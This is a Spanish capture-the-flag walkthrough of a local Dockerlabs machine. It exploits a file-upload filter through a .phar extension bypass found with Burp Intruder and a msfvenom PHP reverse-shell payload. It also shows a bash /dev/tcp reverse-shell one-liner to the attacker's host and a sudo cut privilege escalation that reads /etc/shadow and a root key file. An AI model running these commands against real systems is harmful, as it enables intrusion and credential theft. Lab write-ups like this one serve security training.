# Dockerlabs

Maquinas a utilizar Kali Linux y la maquina dockerlabs en  [https://dockerlabs.es/](/https://dockerlabs.es/)

### ¿Cómo descargarla y Desplegar la maquina  dockerlabs?

![image.png](./imagenes/image.png)

La descargamos y descomprimimos dentro de nuestra kali. Abrimos un terminal y nos movemos a donde tengamos los archivos descomprimidos . En mi caso el escritorio y escribimos el siguiente comando para desplegarla.

```bash
sudo bash auto_deploy.sh dockerlabs.tar
```

![image.png](./imagenes/image%201.png)

Encaso de que Docker no este instalado en el sistema nos lo descargara y lo instalara antes del despliegue de la maquina dockerlabs.

![image.png](./imagenes/image%202.png)

![image.png](./imagenes/image%203.png)

---

### **Reconocimiento**

- Hacemos un nmap sobre la maquina victima .
    
    ```bash
    sudo nmap -p- -sS -sV --min-rate 5000 -n -vvv -Pn 172.17.0.2
    ```
    
    ![image.png](./imagenes/image%204.png)
    

- Vemos que tiene abierto el puerto 80 . Vamos a ver que nos muestra dentro del navegador web.
    
    ![image.png](./imagenes/image%205.png)
    
    `CTRL+U`
    
    ![image.png](./imagenes/image%206.png)
    
    No parece que haya nada extraño a simple vista en el código.
    
- Hacemos **fuzzing web** con gobuster para encontrar ubicaciones dentro de la url**.** Utilizaremos los diccionarios de seclists
    - Para instalar los diccionarios de seclists en caso de no tenerlos.
        
        ```bash
        sudo apt update
        sudo apt install seclists
        ```
        
        ![image.png](./imagenes/image%207.png)
        
    
    ```bash
    gobuster dir -u "[http://172.17.0.2](./imagenes/http://172.17.0.2/)" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,txt
    
    ```
    
    ![image.png](./imagenes/image%208.png)
    
- Miramos a donde nos llevan las URL sospechosas.
    
    http://172.17.0.2/uploads/ . Esta ubicación nos muestra donde se alojan los archivo que subamos al servidor.
    
    ![image.png](./imagenes/image%209.png)
    
    http://172.17.0.2/upload.php . No carga nada
    
    ![image.png](./imagenes/image%2010.png)
    
    http://172.17.0.2/machine.php . Tenemos el Formulario de subida de archivos.
    
    ![image.png](./imagenes/image%2011.png)
    

---

### **Análisis de vulnerabilidades y modelado de amenazas**

- Nuestro primer impulso seria crear un archivo malicioso y subirlo al servidor.
    - Miramos nuestra IP
        
        ```bash
        hostname -I
        ```
        
        ![image.png](./imagenes/image%2012.png)
        
    
    - Creamos un archivo malicioso con msfvenom
        
        ```bash
        msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=443 -f raw > bicho.php 
        ```
        
        ![image.png](./imagenes/image%2013.png)
        
    
    - Lo subimos al servidor en http://172.17.0.2/machine.php
        
        ![image.png](./imagenes/image%2014.png)
        
        ![image.png](./imagenes/image%2015.png)
        
        ![image.png](./imagenes/image%2016.png)
        
        Vemos que no es posible subirlo ya que el servidor tiene restricciones de tipos de archivo que se pueden subir.
        

---

### **Explotación**

- Activamos la configuración del navegador web para que funciones Burpsuite . y lanzamos BurpSuite.
    
    ![image.png](./imagenes/image%2017.png)
    
    ![image.png](./imagenes/image%2018.png)
    

- Activamos la intercepción y volvemos a intentar cargar el archivo malicioso.
    
    ![image.png](./imagenes/image%2019.png)
    
    ![image.png](./imagenes/image%2020.png)
    

- Pulsamos CTRL+R para cargar la petición en el repeater de BurpSuite.
    
    `CTRL+R`
    
    ![image.png](./imagenes/image%2021.png)
    

- Nuestro objetivo es encontrar una extensión que pase el filtro pero que nos deje ejecutar nuestro archivo malicioso PHP.
    
    Para ello voy a utilizar un articulo de la web HackTricks donde hablan del tema.
    
    [https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html](./imagenes/https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)
    
    ![image.png](./imagenes/image%2022.png)
    

- Voy a probar para encontrar en BurpSuite las posibles extensiones que me aconseja. Para automatizarlo el proceso usaremos la pestaña Intruder.
    - Seleccionamos toda la petición, pulsamos tecla derecha del ratón y pulsamos en “Send to Intruder”. O también pulsando `CTRL+I`
        
        ![image.png](./imagenes/image%2023.png)
        
    - Pulsamos el botón “Clear $” para limpiar la petición. Escogemos lo que queremos modificar y que se vaya sustituyendo, en nuestro caso la extensión del archivo y pulsamos el botón “Add $”.
        
        ![image.png](./imagenes/image%2024.png)
        
        Quedando de esta manera:
        
        ![image.png](./imagenes/5bfdaa75-157b-4ac3-9d63-a9076def3b24.png)
        
    - Nos situamos en “Payload configuration” el menú de la parte derecha de la pantalla y vamos añadiendo extensiones a la lista utilizando la tecla “Add”.
        
        ![image.png](./imagenes/image%2025.png)
        
    - Una vez tengamos las extensiones metidas pulsamos en “Start attack”
        
        ![image.png](./imagenes/image%2026.png)
        
    - En la ventana que se nos abre pulsamos a la pestaña “Response” y miramos una a una las respuestas del servidor para ver si alguna de ellas es positiva.
        
        ![image.png](./imagenes/image%2027.png)
        
        Vemos que extensión “phar” esta permitida.
        
- Desactivamos la intercepción y miramos si nos a subido el archivo http://172.17.0.2/uploads/
    
    ![image.png](./imagenes/image%2028.png)
    
- Abrimos una terminal y nos ponemos a la escucha con netcat en el puerto que habíamos puesto en nuestro archivo malicioso.
    
    ```bash
    sudo nc -nlvp 443
    ```
    
    ![image.png](./imagenes/image%2029.png)
    

- Como  las conexiones con netcat y msfvenom no duran mucho tiempo tenemos que estabilizarla.
    - En otra terminal nos ponemos a la escucha en otro puerto , por ejemplo en el 444
    - Usaremos la web [https://www.revshells.com/](./imagenes/https://www.revshells.com/) ****para crear la revershell. Poniendo los datos necesarios. En este caso nuestra IP y un nuevo puerto
        
        ![image.png](./imagenes/image%2030.png)
        
    
    - Creamos una nueva conexión con netcat en el puerto 444 en una nueva terminal.
        
        ```bash
        sudo nc -nlvp 444
        ```
        
        ![image.png](./imagenes/image%2031.png)
        
    
    - Ejecutamos nuestro archivo malicioso y vemos como  se establece conexión en la escucha en el puerto 443 y escribimos lo siguiente en el aprovechando lo que hemos obtenido del a web  https://www.revshells.com/ ****
        
        `bash -c "**sh** -i >& /dev/tcp/**172.17.0.1**/**444** 0>&1"`
        
        ![image.png](./imagenes/image%2032.png)
        
    
    - Consiguiendo una conexión estable en la escucha 444.
        
        ![image.png](./imagenes/image%2033.png)
        

---

- Hacemos un Tratamiento de la TTY para movernos mas cómodamente
    - Escribimos el siguiente comando  y veremos que adquirimos un prompt.
        
        `script /dev/null -c bash`
        
        ![image.png](./imagenes/image%2034.png)
        
    - Hacemos un **`CTRL+Z`**
        
        ![image.png](./imagenes/image%2035.png)
        
    - Escribimos a continuación.
        
        `stty raw -echo; fg`
        
        ![image.png](./imagenes/image%2036.png)
        
    - Escribimos `reset xterm` . Es posible que no se muestre cuando lo escribimos pero aun así lo escribimos y pulsamos Enter. Y nos aparecerá la siguiente pantalla.
        
        ![image.png](./imagenes/image%2037.png)
        
        ![image.png](./imagenes/image%2038.png)
        
    - Por ultimo tenemos que exportar 2 variables. escribimos lo siguiente.
        
        `export TERM=xterm`
        
        `export SHELL=bash`
        
        ![image.png](./imagenes/image%2039.png)
        
        Con esto  ya nos aceptaría los comandos que antes no lo hacia.
        

---

## Escalada de privilegios

- Vamos a ver si podemos escalar privilegios con sudo.
    
    `sudo -l`
    
    ![image.png](./imagenes/image%2040.png)
    
    - Nos vamos a la web [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/) y buscamos información de cut y grep para la escalada de privilegios con sudo.
        
        ![image.png](./imagenes/image%2041.png)
        
        ![image.png](./imagenes/image%2042.png)
        
    - En este caso voy a utilizar cut para ver la información de archivo **/etc/shadow**
        
        `sudo cut -d ":" -f1,2 /etc/shadow`
        
        ![image.png](./imagenes/image%2043.png)
        
        Nos muestra los hash de los usuarios root y dbadmin.
        
        Por aquí no puedo avanzar ya que si los analizamos veremos que son hash  creados con el algoritmo **yescrypt** que no esta soportado por John the Ripper.
        
- Investigando vemos que en la carpeta /opt hay un archivo llamado nota.txt con una pista
    
    ![image.png](./imagenes/image%2044.png)
    

- Aprovechamos la vulnerabilidad cut para leer el archivo clave.txt que nos menciona
    
    `sudo cut -d ":" -f1 /root/clave.txt` 
    
    ![image.png](./imagenes/image%2045.png)
    
    `su root`
    
    ![image.png](./imagenes/image%2046.png)
    

Ya somos root